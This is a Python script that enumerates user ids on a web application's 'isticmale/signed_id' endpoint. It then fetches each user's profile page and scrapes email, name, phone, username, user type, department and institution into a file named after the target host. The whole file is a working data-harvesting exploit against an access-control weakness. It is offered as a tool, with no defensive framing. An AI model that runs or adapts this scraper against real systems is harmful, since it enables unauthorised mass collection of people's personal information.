import subprocess,os
from bs4 import BeautifulSoup
import requests,random
from datetime import datetime
from urllib.parse import urlparse
from scripts.common import *
    

def get_signed_key(url):

    # Make a GET request
    response = requests.get(url)

    # Check the response
    if response.status_code == 200:
        # Parse the JSON response
        json_response = response.json()

        # Print only the "Message" field
        if 'Message' in json_response:
            result = f"User id is: {id}\nMessage: {json_response['Message']}\n\n"
            return result
        else:
            return None
    else:
        return None

def get_hash(result):
    message_index = result.find("Message:")
    if message_index != -1:
        # Extract and print the content after "Message:"
        message_content = result[message_index + len("Message:"):].strip()
        return message_content
    else:
        return None
    

def fetch_signed_id(get_url):
    results = []
    for fetched_id in range(1, 101):
        profile_url = f"{get_url}isticmale/signed_id/{fetched_id}/"
        result = get_signed_key(profile_url)
        if result is not None:
            content = get_hash(result)
            results.append(content)
    return results


def get_user_info(url):
    
    response = requests.get(url)

    # Check the response
    if response.status_code == 200:
        # Parse HTML content with BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Extract information
        profile_image = soup.find('div', {'class': 'profile_image'}).find('img')['src']
        email = soup.find('div', {'class': 'profile_image'}).find('p').text.strip()
        name = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Name:').find_next('p').text.strip()
        phone = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Phone').find_next('p').text.strip()
        username = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Username:').find_next('p').text.strip()
        nooca_user = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Nuuca User').find_next('p').text.strip()
        waaxda_userka = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Waaxda User-ka').find_next('p').text.strip()
        institution = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Institution:').find_next('p').text.strip()

        # Extract user ID from the provided HTML snippet
        user_id = soup.select_one('a[data-user-id]')['data-user-id']

        # Return the extracted information
        return {
            "user_id": user_id,
            "profile_image": profile_image,
            "email": email,
            "name": name,
            "phone": phone,
            "username": username,
            "nooca_user": nooca_user,
            "waaxda_userka": waaxda_userka,
            "institution": institution
        }

    return None

def start_display_users(url):
    hashed_id = fetch_signed_id(url)
    if hashed_id:
        ip_parse = urlparse(url)
        filename = f"show_users_for_{ip_parse.netloc.split(":")[0]}_{datetime.now().strftime("%Y-%m-%d %H")}_{random.randint(0000, 9999)}"
        for hashed_id in hashed_id:
            hashed_url = f"{url}isticmale/userprofile/{hashed_id}/"
            user_profile = get_user_info(hashed_url)
            if user_profile:
                for key,value in user_profile.items():
                    write_to_file(filename,f"{key} : {value}\n")
                    print(f"{key} : {value}")
                print(f"\n")
                write_to_file(filename,f"\n")
                print("Here is the profiles of the user system")
            else:
               print("There is No User Profile in the System")
    else:
        print("Failed To Fetch The Hash ")
